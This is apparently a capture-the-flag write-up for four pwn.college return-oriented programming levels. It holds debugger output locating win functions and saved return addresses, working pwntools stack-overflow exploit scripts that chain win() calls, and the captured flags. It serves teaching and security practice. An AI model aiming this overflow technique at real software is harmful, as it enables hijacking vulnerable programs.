---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/program-security/return-oriented-programming
---

## Loose Link (Easy)

```
hacker@return-oriented-programming~loose-link-easy:/$ /challenge/loose-link-easy 
###
### Welcome to /challenge/loose-link-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there is a win() function.
win() will open the flag and send its data to stdout; it is at 0x401d8e.
In order to get the flag, you will need to call this function.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7ffee0096228, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

The solution to this challenge is a simple ret2win exploit as we used in [this](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#pies-easy) challenge.

Let's find the offset of `win()` within the program.

### `win()`

```
hacker@return-oriented-programming~loose-link-easy:/$ objdump -d -M intel /challenge/loose-link-easy | grep "<win>:"
0000000000401d8e <win>:
```

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x401d8e

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-easy': pid 38562
/home/hacker/script.py:16: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (513B)
[*] Process '/challenge/loose-link-easy' stopped with exit code -11 (SIGSEGV) (pid 38562)
[!!!] FLAG FOUND !!!

Received 80 bytes! This is potentially 1 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 2 gadgets of ROP chain at 0x7ffd181688f8.
| 0x0000000000401d8e: endbr64  ; push rbp ; mov rbp, rsp ; lea rdi, [rip + 0x13fb] ; call 0x401150 ; 
| 0x0000000000000000: (UNMAPPED MEMORY)

Leaving!
You win! Here is your flag:
pwn.college{Y40hUq96Ina_w4qo4LYvtgBa4yR.0VM0MDL4ITM0EzW} 
```

&nbsp;

## Loose Link (Hard)

```
hacker@return-oriented-programming~loose-link-hard:/$ /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###
```

As expected, this level, gives us nothing.

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win()` within the program

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010d0  putchar@plt
0x00000000004010e0  __errno_location@plt
0x00000000004010f0  puts@plt
0x0000000000401100  write@plt
0x0000000000401110  printf@plt
0x0000000000401120  geteuid@plt
0x0000000000401130  read@plt
0x0000000000401140  setvbuf@plt
0x0000000000401150  open@plt
0x0000000000401160  strerror@plt
0x0000000000401170  _start
0x00000000004011a0  _dl_relocate_static_pie
0x00000000004011b0  deregister_tm_clones
0x00000000004011e0  register_tm_clones
0x0000000000401220  __do_global_dtors_aux
0x0000000000401250  frame_dummy
0x0000000000401256  bin_padding
0x00000000004018a6  win
0x00000000004019a3  challenge
0x00000000004019e2  main
0x0000000000401aa0  __libc_csu_init
0x0000000000401b10  __libc_csu_fini
0x0000000000401b18  _fini
```

Let's get the offset of `win()` first.

### `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4018a6 in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004019a3 <+0>:     endbr64
   0x00000000004019a7 <+4>:     push   rbp
   0x00000000004019a8 <+5>:     mov    rbp,rsp
   0x00000000004019ab <+8>:     sub    rsp,0x40
   0x00000000004019af <+12>:    mov    DWORD PTR [rbp-0x24],edi
   0x00000000004019b2 <+15>:    mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004019b6 <+19>:    mov    QWORD PTR [rbp-0x38],rdx
   0x00000000004019ba <+23>:    lea    rax,[rbp-0x20]
   0x00000000004019be <+27>:    mov    edx,0x1000
   0x00000000004019c3 <+32>:    mov    rsi,rax
   0x00000000004019c6 <+35>:    mov    edi,0x0
   0x00000000004019cb <+40>:    call   0x401130 <read@plt>
   0x00000000004019d0 <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004019d3 <+48>:    lea    rdi,[rip+0x732]        # 0x40210c
   0x00000000004019da <+55>:    call   0x4010f0 <puts@plt>
   0x00000000004019df <+60>:    nop
   0x00000000004019e0 <+61>:    leave
   0x00000000004019e1 <+62>:    ret
End of assembler dump.
```

We can see that a call to `read@plt` is made at `challenge+40`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x4019cb
```

```
pwndbg> run
Starting program: /challenge/loose-link-hard 
###
### Welcome to /challenge/loose-link-hard!
###


Breakpoint 1, 0x00000000004019cb in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 RBX  0x401aa0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
 R8   0
 R9   0x2b
 R10  0x40057f ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x7ec61f7bfce0 (setvbuf) ◂— endbr64 
 R12  0x401170 (_start) ◂— endbr64 
 R13  0x7ffdb569aee0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffdb569adc0 —▸ 0x7ffdb569adf0 ◂— 0
 RSP  0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
 RIP  0x4019cb (challenge+40) ◂— call read@plt
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0x4019cb <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
        nbytes: 0x1000
 
   0x4019d0 <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x4019d3 <challenge+48>    lea    rdi, [rip + 0x732]           RDI => 0x40210c ◂— 'Leaving!'
   0x4019da <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x4019df <challenge+60>    nop    
   0x4019e0 <challenge+61>    leave  
   0x4019e1 <challenge+62>    ret    
 
   0x4019e2 <main>            endbr64 
   0x4019e6 <main+4>          push   rbp
   0x4019e7 <main+5>          mov    rbp, rsp
   0x4019ea <main+8>          sub    rsp, 0x20
────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdb569ad80 —▸ 0x7ec61f9244a0 (_IO_file_jumps) ◂— 0
01:0008│-038     0x7ffdb569ad88 —▸ 0x7ffdb569aef8 —▸ 0x7ffdb569c693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-030     0x7ffdb569ad90 —▸ 0x7ffdb569aee8 —▸ 0x7ffdb569c678 ◂— '/challenge/loose-link-hard'
03:0018│-028     0x7ffdb569ad98 ◂— 0x11f7bfde5
04:0020│ rax rsi 0x7ffdb569ada0 —▸ 0x401aa0 (__libc_csu_init) ◂— endbr64 
05:0028│-018     0x7ffdb569ada8 —▸ 0x7ffdb569adf0 ◂— 0
06:0030│-010     0x7ffdb569adb0 —▸ 0x401170 (_start) ◂— endbr64 
07:0038│-008     0x7ffdb569adb8 —▸ 0x7ffdb569aee0 ◂— 1
──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4019cb challenge+40
   1         0x401a87 main+165
   2   0x7ec61f75f083 __libc_start_main+243
   3         0x40119e _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdb569add0:
 rip = 0x4019cb in challenge; saved rip = 0x401a87
 called by frame at 0x7ffdb569ae00
 Arglist at 0x7ffdb569adc0, args: 
 Locals at 0x7ffdb569adc0, Previous frame's sp is 0x7ffdb569add0
 Saved registers:
  rbp at 0x7ffdb569adc0, rip at 0x7ffdb569adc8
```

- [x] Location of buffer: `0x7ffdb569ada0`
- [x] Location of return address to `main()`: `0x7ffdb569adc8`
- [x] Offset of instruction in `win()` within the program: `0x4018a6`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize required values
win_offset = 0x4018a6
buffer_addr = 0x7ffdb569ada0
addr_of_saved_ip = 0x7ffdb569adc8

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/loose-link-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~loose-link-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/loose-link-hard': pid 5958
[+] Receiving all data: Done (148B)
[*] Process '/challenge/loose-link-hard' stopped with exit code -11 (SIGSEGV) (pid 5958)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/loose-link-hard!
###

Leaving!
You win! Here is your flag:
pwn.college{wMKUPEPkoVPhW8f3RHkBro9Nftw.0lM0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Easy)

```
hacker@return-oriented-programming~call-chain-easy:/$ /challenge/call-chain-easy 
###
### Welcome to /challenge/call-chain-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

In this challenge, there are 2 stages of win functions. The functions are labeled `win_stage_1` through `win_stage_2`.
In order to get the flag, you will need to call all of these stages in order.

You can call a function by directly overflowing into the saved return address,
which is stored at 0x7fffa5868628, 72 bytes after the start of your input buffer.
That means that you will need to input at least 80 bytes (48 to fill the buffer,
24 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).
```

This time we have to call two functions: `win_stage_1` and `win_stage_2`.

### `win_stage_1`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_1>:"
0000000000401ffd <win_stage_1>:
```

### `win_stage_2`

```
hacker@return-oriented-programming~call-chain-easy:/$ objdump -d -M intel /challenge/call-chain-easy | grep "<win_stage_2>:"
00000000004020aa <win_stage_2>:
```

If we overwrite the return address with the address of `win_stage_1` and place the address of `win_stage_2` after it, when the program returns from `win_stage_1`, it will execute `win_stage_2`, thus chaining our attack for us. 

```py
from pwn import *

# Initialize required values
win_stage_1_offset = 0x401ffd
win_stage_2_offset = 0x4020aa

# Calculate offset
offset = 72

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-easy')
    try:
        p.recvuntil("and 8 that will overwrite the return address).")
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-easy:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-easy': pid 4197
/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("and 8 that will overwrite the return address).")
[+] Receiving all data: Done (1.17KB)
[*] Process '/challenge/call-chain-easy' stopped with exit code -11 (SIGSEGV) (pid 4197)
[!!!] FLAG FOUND !!!

Received 88 bytes! This is potentially 2 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 3 gadgets of ROP chain at 0x7ffd95ca9c08.
| 0x0000000000401ffd: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x117a] ; mov eax, 0 ; call 0x401210 ; 
| 0x00000000004020aa: endbr64  ; push rbp ; mov rbp, rsp ; sub rsp, 0x120 ; mov dword ptr [rbp - 0x114], edi ; mov esi, 0 ; lea rdi, [rip + 0x10cd] ; mov eax, 0 ; call 0x401210 ; 
| 0x00007ffd95ca9d38: xchg edi, eax ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; mov al, 0xa9 ; retf 0xfd95 ; jg 0x7ffd95ca9d47 ; add ah, al ; test eax, 0x7ffd95ca ; add byte ptr [rax], al ; loopne 0x7ffd95ca9cfb ; retf 0xfd95 ; jg 0x7ffd95ca9d57 ; add byte ptr [rip - 0x26a3556], dl ; jg 0x7ffd95ca9d5f ; add byte ptr [rax - 0x26a3556], dh ; jg 0x7ffd95ca9d67 ; add byte ptr [rsi - 0x26a3556], dh ; jg 0x7ffd95ca9d6f ; add bl, dl ; stosb byte ptr [rdi], al ; retf 0xfd95 ; jg 0x7ffd95ca9d77 ; 

Leaving!
pwn.college{cBWEQcy5TduarDbN4Kk3_8Qyq80.01M0MDL4ITM0EzW}
```

&nbsp;

## Call Chain (Hard)

```
hacker@return-oriented-programming~call-chain-hard:/$ /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###
```

Let's check which functions the program has.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x00000000004010c0  putchar@plt
0x00000000004010d0  puts@plt
0x00000000004010e0  write@plt
0x00000000004010f0  printf@plt
0x0000000000401100  lseek@plt
0x0000000000401110  close@plt
0x0000000000401120  read@plt
0x0000000000401130  setvbuf@plt
0x0000000000401140  open@plt
0x0000000000401150  _start
0x0000000000401180  _dl_relocate_static_pie
0x0000000000401190  deregister_tm_clones
0x00000000004011c0  register_tm_clones
0x0000000000401200  __do_global_dtors_aux
0x0000000000401230  frame_dummy
0x0000000000401236  bin_padding
0x000000000040223e  win_stage_1
0x00000000004022eb  win_stage_2
0x000000000040239c  challenge
0x00000000004023e7  main
0x00000000004024a0  __libc_csu_init
0x0000000000402510  __libc_csu_fini
0x0000000000402518  _fini
```

We need the following for exploitation:

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [ ] Offset of instruction in `win_stage_1()` within the program
- [ ] Offset of instruction in `win_stage_2()` within the program

Let's first get the offsets of the `win_stage_*()` functions.

### `win_stage_1()`

```
pwndbg> info address win_stage_1
Symbol "win_stage_1" is at 0x40223e in a file compiled without debugging.
```

### `win_stage_2()`

```
pwndbg> info address win_stage_2
Symbol "win_stage_2" is at 0x4022eb in a file compiled without debugging.
```

- [ ] Location of buffer
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040239c <+0>:     endbr64
   0x00000000004023a0 <+4>:     push   rbp
   0x00000000004023a1 <+5>:     mov    rbp,rsp
   0x00000000004023a4 <+8>:     sub    rsp,0xa0
   0x00000000004023ab <+15>:    mov    DWORD PTR [rbp-0x84],edi
   0x00000000004023b1 <+21>:    mov    QWORD PTR [rbp-0x90],rsi
   0x00000000004023b8 <+28>:    mov    QWORD PTR [rbp-0x98],rdx
   0x00000000004023bf <+35>:    lea    rax,[rbp-0x80]
   0x00000000004023c3 <+39>:    mov    edx,0x1000
   0x00000000004023c8 <+44>:    mov    rsi,rax
   0x00000000004023cb <+47>:    mov    edi,0x0
   0x00000000004023d0 <+52>:    call   0x401120 <read@plt>
   0x00000000004023d5 <+57>:    mov    DWORD PTR [rbp-0x4],eax
   0x00000000004023d8 <+60>:    lea    rdi,[rip+0xc2b]        # 0x40300a
   0x00000000004023df <+67>:    call   0x4010d0 <puts@plt>
   0x00000000004023e4 <+72>:    nop
   0x00000000004023e5 <+73>:    leave
   0x00000000004023e6 <+74>:    ret
End of assembler dump.
```

A the call to `read@plt` is made at `challenge+52`.
Let's set a breakpoint and run the program.

```
pwndbg> break *(challenge+52)
Breakpoint 1 at 0x4023d0
```

```
pwndbg> run
Starting program: /challenge/call-chain-hard 
###
### Welcome to /challenge/call-chain-hard!
###

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────
 RAX  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 RBX  0x4024a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x2b
 R10  0xfffffffffffff58f
 R11  0x715c4786dce0 (setvbuf) ◂— endbr64 
 R12  0x401150 (_start) ◂— endbr64 
 R13  0x7fff0ca867a0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff0ca86680 —▸ 0x7fff0ca866b0 ◂— 0
 RSP  0x7fff0ca865e0 ◂— 0
 RIP  0x4023d0 (challenge+52) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────
 ► 0x4023d0 <challenge+52>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x4023d5 <challenge+57>    mov    dword ptr [rbp - 4], eax
   0x4023d8 <challenge+60>    lea    rdi, [rip + 0xc2b]           RDI => 0x40300a ◂— 'Leaving!'
   0x4023df <challenge+67>    call   puts@plt                    <puts@plt>
 
   0x4023e4 <challenge+72>    nop    
   0x4023e5 <challenge+73>    leave  
   0x4023e6 <challenge+74>    ret    
 
   0x4023e7 <main>            endbr64 
   0x4023eb <main+4>          push   rbp
   0x4023ec <main+5>          mov    rbp, rsp
   0x4023ef <main+8>          sub    rsp, 0x20
───────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff0ca865e0 ◂— 0
01:0008│-098     0x7fff0ca865e8 —▸ 0x7fff0ca867b8 —▸ 0x7fff0ca87693 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7fff0ca865f0 —▸ 0x7fff0ca867a8 —▸ 0x7fff0ca87678 ◂— '/challenge/call-chain-hard'
03:0018│-088     0x7fff0ca865f8 ◂— 0x1479d6723
04:0020│ rax rsi 0x7fff0ca86600 —▸ 0x715c479d24a0 (_IO_file_jumps) ◂— 0
05:0028│-078     0x7fff0ca86608 —▸ 0x715c479dc540 ◂— 0x715c479dc540
06:0030│-070     0x7fff0ca86610 ◂— 0
07:0038│-068     0x7fff0ca86618 —▸ 0x715c4787b5dd (_IO_default_setbuf+253) ◂— mov edx, dword ptr [rbx]
─────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4023d0 challenge+52
   1         0x40248c main+165
   2   0x715c4780d083 __libc_start_main+243
   3         0x40117e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of buffer: `0x7fff0ca86600`
- [ ] Location of return address to `main()`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

```
pwndbg> info frame
Stack level 0, frame at 0x7fff0ca86690:
 rip = 0x4023d0 in challenge; saved rip = 0x40248c
 called by frame at 0x7fff0ca866c0
 Arglist at 0x7fff0ca86680, args: 
 Locals at 0x7fff0ca86680, Previous frame's sp is 0x7fff0ca86690
 Saved registers:
  rbp at 0x7fff0ca86680, rip at 0x7fff0ca86688
```

- [x] Location of buffer: `0x7fff0ca86600`
- [x] Location of return address to `main()`: `0x7fff0ca86688`
- [x] Offset of instruction in `win_stage_1()` within the program: `0x40223e`
- [x] Offset of instruction in `win_stage_2()` within the program: `0x4022eb`

### Exploit

```py
from pwn import *

# Initialize required values
win_stage_1_offset = 0x40223e
win_stage_2_offset = 0x4022eb
buffer_addr = 0x7fff0ca86600
addr_of_saved_ip = 0x7fff0ca86688

# Calculate offset
offset = addr_of_saved_ip - buffer_addr

# Craft payload
payload = b"A" * offset
payload += p64(win_stage_1_offset)
payload += p64(win_stage_2_offset)

attempt = 0

while True:
    attempt += 1
    print(f"[+] Attempt {attempt}")

    p = process('/challenge/call-chain-hard')
    try:
        p.send(payload)
        output = p.recvall(timeout=1).decode(errors="ignore")

        if "pwn.college{" in output:
            print("[!!!] FLAG FOUND !!!")
            print(output)
            break

    except Exception:
        pass
    finally:
        p.close()
```

```
hacker@return-oriented-programming~call-chain-hard:/$ python ~/script.py 
[+] Attempt 1
[+] Starting local process '/challenge/call-chain-hard': pid 12207
[+] Receiving all data: Done (118B)
[*] Process '/challenge/call-chain-hard' stopped with exit code -11 (SIGSEGV) (pid 12207)
[!!!] FLAG FOUND !!!
###
### Welcome to /challenge/call-chain-hard!
###

Leaving!
pwn.college{kUbPQlmZDS13sRzrmbin50xWwe_.0FN0MDL4ITM0EzW}
```